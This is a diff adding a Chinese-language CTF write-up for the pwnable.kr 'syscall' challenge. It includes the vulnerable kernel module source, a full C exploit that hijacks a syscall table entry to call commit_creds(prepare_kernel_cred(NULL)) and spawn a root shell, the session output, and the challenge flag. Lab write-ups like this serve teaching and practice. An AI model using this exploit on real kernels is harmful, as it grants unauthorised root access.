@@ -15162,3 +15162,545 @@ Sorry for blaming shell-strom.org :) it was my ignorance!
 
 ------
 
+### syscall
+
+这是**Pwnable.kr**的第三十一个挑战`syscall`，来自**[Rookiss]**部分。
+
+```bash
+I made a new system call for Linux kernel.
+It converts lowercase letters to upper case letters.
+would you like to see the implementation?
+
+Download : http://pwnable.kr/bin/syscall.c
+
+
+ssh syscall@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机，这题`SSH`进去跟 [**leg**](#leg) 有得一比。
+
+```
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh syscall@pwnable.kr -p2222
+syscall@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have new mail.
+Last login: Mon Jun 26 10:09:42 2023 from 121.18.90.141
+pulseaudio: pa_context_connect() failed
+pulseaudio: Reason: Connection refused
+pulseaudio: Failed to initialize PA contextaudio: Could not init `pa' audio driver
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+Booting Linux on physical CPU 0x0
+Initializing cgroup subsys cpuset
+Linux version 3.11.4 (root@ubuntu) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #13 SMP Fri Jul 11 00:48:31 PDT 2014
+CPU: ARMv7 Processor [410fc090] revision 0 (ARMv7), cr=10c53c7d
+CPU: PIPT / VIPT nonaliasing data cache, VIPT nonaliasing instruction cache
+Machine: ARM-Versatile Express
+Memory policy: ECC disabled, Data cache writealloc
+sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms
+PERCPU: Embedded 7 pages/cpu @805ea000 s7296 r8192 d13184 u32768
+Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 27940
+Kernel command line: 'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init'
+PID hash table entries: 512 (order: -1, 2048 bytes)
+Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
+Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
+Memory: 57292K/112640K available (3579K kernel code, 166K rwdata, 1020K rodata, 203K init, 138K bss, 55348K reserved)
+Virtual kernel memory layout:
+    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
+    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
+    vmalloc : 0x87000000 - 0xff000000   (1920 MB)
+    lowmem  : 0x80000000 - 0x86e00000   ( 110 MB)
+    modules : 0x7f000000 - 0x80000000   (  16 MB)
+      .text : 0x80008000 - 0x80485f40   (4600 kB)
+      .init : 0x80486000 - 0x804b8c80   ( 204 kB)
+      .data : 0x804ba000 - 0x804e3b20   ( 167 kB)
+       .bss : 0x804e3b20 - 0x805065d0   ( 139 kB)
+SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
+Hierarchical RCU implementation.
+        RCU restricting CPUs from NR_CPUS=4 to nr_cpu_ids=1.
+NR_IRQS:16 nr_irqs:16 16
+GIC CPU mask not found - kernel will fail to boot.
+GIC CPU mask not found - kernel will fail to boot.
+smp_twd: clock not found -2
+Console: colour dummy device 80x30
+Calibrating delay loop... 443.59 BogoMIPS (lpj=2217984)
+pid_max: default: 32768 minimum: 301
+Mount-cache hash table entries: 512
+CPU: Testing write buffer coherency: ok
+CPU0: thread -1, cpu 0, socket 0, mpidr 80000000
+Setting up static identity map for 0x80366218 - 0x80366270
+Brought up 1 CPUs
+SMP: Total of 1 processors activated (443.59 BogoMIPS).
+CPU: All CPU(s) started in SVC mode.
+NET: Registered protocol family 16
+DMA: preallocated 256 KiB pool for atomic coherent allocations
+L310 cache controller enabled
+l2x0: 8 ways, CACHE_ID 0x410000c8, AUX_CTRL 0x02420000, Cache size: 131072 B
+hw-breakpoint: debug architecture 0x4 unsupported.
+Serial: AMBA PL011 UART driver
+mb:uart0: ttyAMA0 at MMIO 0x10009000 (irq = 37) is a PL011 rev1
+console [ttyAMA0] enabled
+mb:uart1: ttyAMA1 at MMIO 0x1000a000 (irq = 38) is a PL011 rev1
+mb:uart2: ttyAMA2 at MMIO 0x1000b000 (irq = 39) is a PL011 rev1
+mb:uart3: ttyAMA3 at MMIO 0x1000c000 (irq = 40) is a PL011 rev1
+bio: create slab <bio-0> at 0
+SCSI subsystem initialized
+usbcore: registered new interface driver usbfs
+usbcore: registered new interface driver hub
+usbcore: registered new device driver usb
+Advanced Linux Sound Architecture Driver Initialized.
+Switched to clocksource v2m-timer1
+NET: Registered protocol family 2
+TCP established hash table entries: 1024 (order: 1, 8192 bytes)
+TCP bind hash table entries: 1024 (order: 1, 8192 bytes)
+TCP: Hash tables configured (established 1024 bind 1024)
+TCP: reno registered
+UDP hash table entries: 256 (order: 1, 8192 bytes)
+UDP-Lite hash table entries: 256 (order: 1, 8192 bytes)
+NET: Registered protocol family 1
+RPC: Registered named UNIX socket transport module.
+RPC: Registered udp transport module.
+RPC: Registered tcp transport module.
+RPC: Registered tcp NFSv4.1 backchannel transport module.
+Trying to unpack rootfs image as initramfs...
+rootfs image is not initramfs (junk in compressed archive); looks like an initrd
+Freeing initrd memory: 49152K (83700000 - 86700000)
+CPU PMU: probing PMU on CPU 0
+hw perfevents: enabled with ARMv7 Cortex-A9 PMU driver, 1 counters available
+jffs2: version 2.2. (NAND) © 2001-2006 Red Hat, Inc.
+msgmni has been set to 207
+io scheduler noop registered (default)
+clcd-pl11x ct:clcd: PL111 rev2 at 0x10020000
+clcd-pl11x ct:clcd: CT-CA9X4 hardware, XVGA display
+Console: switching to colour frame buffer device 128x48
+brd: module loaded
+smsc911x: Driver version 2008-10-21
+smsc911x smsc911x (unregistered net_device): couldn't get clock -2
+libphy: smsc911x-mdio: probed
+smsc911x smsc911x eth0: attached PHY driver [Generic PHY] (mii_bus:phy_addr=smsc911x-fffffff:01, irq=-1)
+smsc911x smsc911x eth0: MAC Address: 52:54:00:12:34:56
+isp1760 isp1760: NXP ISP1760 USB Host Controller
+isp1760 isp1760: new USB bus registered, assigned bus number 1
+isp1760 isp1760: Scratch test failed.
+isp1760 isp1760: can't setup
+isp1760 isp1760: USB bus 1 deregistered
+isp1760: Failed to register the HCD device
+usbcore: registered new interface driver usb-storage
+mousedev: PS/2 mouse device common for all mice
+rtc-pl031 mb:rtc: rtc core: registered pl031 as rtc0
+mmci-pl18x mb:mmci: mmc0: PL181 manf 41 rev0 at 0x10005000 irq 41,42 (pio)
+usbcore: registered new interface driver usbhid
+usbhid: USB HID core driver
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
+alsa: Could not initialize DAC
+alsa: Failed to open `default':
+alsa: Reason: No such file or directory
+audio: Failed to create voice `lm4549.out'
+input: AT Raw Set 2 keyboard as /devices/mb:kmi0/serio0/input/input0
+aaci-pl041 mb:aaci: ARM AC'97 Interface PL041 rev0 at 0x10004000, irq 43
+aaci-pl041 mb:aaci: FIFO 512 entries
+oprofile: using arm/armv7-ca9
+TCP: cubic registered
+NET: Registered protocol family 17
+VFP support v0.3: implementor 41 architecture 3 part 30 variant 9 rev 0
+rtc-pl031 mb:rtc: setting system clock to 2023-06-26 14:13:45 UTC (1687788825)
+ALSA device list:
+  #0: ARM AC'97 Interface PL041 rev0 at 0x10004000, irq 43
+input: ImExPS/2 Generic Explorer Mouse as /devices/mb:kmi1/serio1/input/input1
+RAMDISK: ext2 filesystem found at block 0
+RAMDISK: Loading 49152KiB [1 disk] into ram disk... done.
+VFS: Mounted root (ext2 filesystem) on device 1:0.
+m: module license 'unspecified' taints kernel.
+Disabling lock debugging due to kernel taint
+sys_upper(number : 223) is added
+cttyhack: can't open '/dev/ttyS0': No such file or directory
+sh: can't access tty; job control turned off
+/ $
+```
+
+下载并查看`syscall.c`的源代码。这段代码是一个`Linux`内核模块，用来添加一个名为`sys_upper`的新系统调用功能：将输入字符串中的小写字母转换为大写字母。
+
+```c
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/syscall.c
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ cat ./syscall.c         
+// adding a new system call : sys_upper
+// 所需的Linux内核头文件, 用于定义模块和系统调用所需的函数和类型
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/vmalloc.h>
+#include <linux/mm.h>
+#include <asm/unistd.h>
+#include <asm/page.h>
+#include <linux/syscalls.h>
+// 宏定义SYS_CALL_TABLE以指定系统调用表的地址, 还宏定义了一个未使用的系统调用编号NR_SYS_UNUSED
+#define SYS_CALL_TABLE          0x8000e348              // manually configure this address!!
+#define NR_SYS_UNUSED           223
+// 定义一个指向系统调用表的指针sct, 将被用于重新映射可写页
+//Pointers to re-mapped writable pages
+unsigned int** sct;
+// 新添加系统调用函数sys_upper() 
+// 它接受俩个指向字符数组的指针作为参数, 将输入字符串的小写字母转换为大写字母并将结果存储在输出数组中
+asmlinkage long sys_upper(char *in, char* out){
+    int len = strlen(in);
+    int i;
+    for(i=0; i<len; i++){
+        if(in[i]>=0x61 && in[i]<=0x7a){
+            out[i] = in[i] - 0x20;
+        }
+        else{
+            out[i] = in[i];
+        }
+    }
+    return 0;
+}
+// 模块的初始化函数initmodule, 将系统调用表的地址赋值给sct变量, 并将系统调用编号为NR_SYS_UNUSED的位置指向新添加的系统调用函数sys_upper。然后打印一条消息表示sys_upper已被添加。
+static int __init initmodule(void ){
+    sct = (unsigned int**)SYS_CALL_TABLE;
+    sct[NR_SYS_UNUSED] = sys_upper;
+    printk("sys_upper(number : 223) is added\n");
+    return 0;
+}
+// 模块的退出函数exitmodule, 它不执行任何操作
+static void __exit exitmodule(void ){
+    return;
+}
+
+module_init( initmodule );
+module_exit( exitmodule );
+```
+
+我们可以发现通过`sys_upper()`函数，未经授权的用户几乎能在任意地址写入任何字节，具体的利用思路如下：
+
+1.准备系统调用例程`sys_getroot()`。
+
+```c
+long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
+    return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
+}
+```
+
+2.使用`syscall sys_upper`将`&sys_CALL_TABLE[sys_upper]`处的`sys_upper`覆盖为`sys_getroot`。
+
+```c
+uint8_t buf[sizeof(void*) + 1] = {0};
+*(void**)buf = (void*)sys_getroot;
+syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
+```
+
+3.再次调用`SYS_upper`，地址为`prepare_kernel_cred`和`commit_creds`。
+
+```c
+syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
+```
+
+启动一个`shell`来查看存储在`/root/flag`中的内容：`Congratz!! addr_limit looks quite IMPORTANT now... huh?`。
+
+```bash
+/ $ cd tmp
+/tmp # cat >t0ur1st.c
+#include <stddef.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#define SYS_CALL_TABLE ((void**)0x8000e348)
+#define SYS_upper 223
+
+long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
+    return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 3) {
+        puts("Usage:");
+        puts("    ./solve <prepare_kernel_cred_addr> <commit_creds_addr>");
+        return -1;
+    } else {
+        size_t i;
+        void* lpfn_prepare_kernel_cred = (void*)strtoul(argv[1], NULL, 16);
+        void* lpfn_commit_creds = (void*)strtoul(argv[2], NULL, 16);
+        uint8_t buf[sizeof(void*) + 1] = {0};
+
+        printf("[*] sys_getroot = %p\n", sys_getroot);
+
+        *(void**)buf = (void*)sys_getroot;
+        for (i = 0; i < sizeof(void*); ++i) {
+            if (buf[i] == 0 || 'a' <= buf[i] && buf[i] <= 'z') {
+                puts("Cannot get root for now.");
+                return -1;
+            }
+        }
+
+        printf("[*] lpfn_prepare_kernel_cred = %p\n", lpfn_prepare_kernel_cred);
+        printf("[*] lpfn_commit_creds = %p\n", lpfn_commit_creds);
+
+        syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
+        syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
+
+        puts("Launching shell...");
+        system("/bin/sh");
+        return 0;
+    }
+}/tmp # gcc -Ttext=0x03bbc010 t0ur1st.c -o t0ur1st
+/tmp # cat /proc/kallsyms | grep prepare_kernel_cred
+8003f924 T prepare_kernel_cred
+80447f34 r __ksymtab_prepare_kernel_cred
+8044ff8c r __kstrtab_prepare_kernel_cred
+/tmp # cat /proc/kallsyms | grep commit_creds
+8003f56c T commit_creds
+8044548c r __ksymtab_commit_creds
+8044ffc8 r __kstrtab_commit_creds
+/tmp # ./t0ur1st 8003f924 8003f56c
+[*] sys_getroot = 0x3bbc089
+[*] lpfn_prepare_kernel_cred = 0x8003f924
+[*] lpfn_commit_creds = 0x8003f56c
+Launching shell...
+/bin/sh: can't access tty; job control turned off
+/tmp # id
+uid=0 gid=0
+/tmp # cat /root/flag
+Congratz!! addr_limit looks quite IMPORTANT now... huh?
+```
+
